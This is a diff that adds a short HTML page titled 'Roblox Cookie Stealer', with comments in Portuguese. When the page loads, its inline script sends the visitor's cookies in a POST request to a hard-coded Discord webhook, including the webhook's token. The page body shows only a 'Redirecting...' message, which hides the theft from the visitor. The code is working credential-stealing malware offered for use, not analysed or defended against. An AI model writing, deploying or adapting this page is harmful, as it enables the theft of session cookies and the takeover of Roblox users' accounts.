@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Cookie Stealer</title>
+    <script>
+        // Enviar os cookies para o seu webhook
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud", true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify({ cookies: document.cookie }));
+    </script>
+</head>
+<body>
+    <h1>Redirecionando...</h1>
+</body>
+</html>
